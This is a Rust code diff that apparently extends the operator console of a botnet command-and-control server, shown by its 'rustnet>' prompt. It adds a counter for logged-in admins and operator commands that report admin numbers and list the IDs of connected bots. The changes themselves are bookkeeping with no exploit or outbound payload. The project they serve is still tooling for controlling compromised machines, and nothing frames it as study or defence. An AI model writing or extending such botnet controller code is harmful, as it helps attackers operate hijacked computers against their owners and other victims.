@@ -7,7 +7,8 @@ use std::io::{ BufRead, BufReader, Read, Write};
 use lazy_static::lazy_static;
 use std::sync::{Arc, Mutex};
 
-use crate::common::BOT_COUNT;
+use crate::common::{BOT_COUNT, BOT_REGISTRY};
+use crate::common::ADMIN_COUNT;
 
 
 static MOTD: &str = "
@@ -28,6 +29,8 @@ lazy_static! {
     static ref COMMAND_REGISTRY: Arc<Mutex<HashMap<String, Box<dyn CommandHandler + Send + 'static>>>> = {
         let mut m = HashMap::new();
         m.insert("!botcount".to_string(), Box::new(BotCountCommand) as Box<dyn CommandHandler + Send>);
+        m.insert("!admincount".to_string(), Box::new(AdminCountCommand) as Box<dyn CommandHandler + Send>);
+        m.insert("!showbots".to_string(), Box::new(ShowBotsCommand) as Box<dyn CommandHandler + Send>);
         Arc::new(Mutex::new(m))
     };
 }
@@ -38,6 +41,32 @@ impl CommandHandler for BotCountCommand {
         let count = BOT_COUNT.lock().unwrap();
         let response = format!("Connected bots: {}\n", count);
         stream.write_all(response.as_bytes()).expect("Failed to write to stream");
+    }
+}
+
+struct AdminCountCommand;
+impl CommandHandler for AdminCountCommand {
+    fn handle(&self, stream: &mut TcpStream, _args: &[String]) {
+        let count = ADMIN_COUNT.lock().unwrap();
+        let response = format!("Connected admins: {}\n", count);
+        stream.write_all(response.as_bytes()).expect("Failed to write to stream");
+    }
+}
+
+struct ShowBotsCommand;
+impl CommandHandler for ShowBotsCommand {
+    fn handle(&self, stream: &mut TcpStream, _args: &[String]) {
+
+        let registry = BOT_REGISTRY.lock().unwrap();
+        if registry.is_empty() {
+            stream.write_all("No bots connected.\n".as_bytes()).expect("Failed to write to stream");
+        } else {
+            stream.write_all("Connected bots: \n".as_bytes()).expect("Failed to write to stream");
+            for bot_id in registry.keys() {
+                let bot_line = format!("-: {}\n", bot_id);
+                stream.write_all(bot_line.as_bytes()).expect("Failed to write to stream");
+            }
+        }
     }
 }
 
@@ -86,6 +115,11 @@ pub fn handle_connection(mut stream: TcpStream, credentials: HashMap<String, Str
 
 fn handle_authenticated_session(mut stream: TcpStream, username: &str) {
     println!("{} has joined!", username);
+    {
+        let mut count = ADMIN_COUNT.lock().unwrap();
+        *count += 1;
+    }
+
     stream.write_all(MOTD.as_bytes()).unwrap();
     stream.write_all(b"rustnet> ").unwrap();
     stream.flush().expect("Failed to flush the stream");
@@ -102,6 +136,10 @@ fn handle_authenticated_session(mut stream: TcpStream, username: &str) {
         };
         if size == 0 {
             println!("{} has disconnected", username);
+            {
+                let mut count = ADMIN_COUNT.lock().unwrap();
+                *count -= 1;
+            }
             break;
         }
         
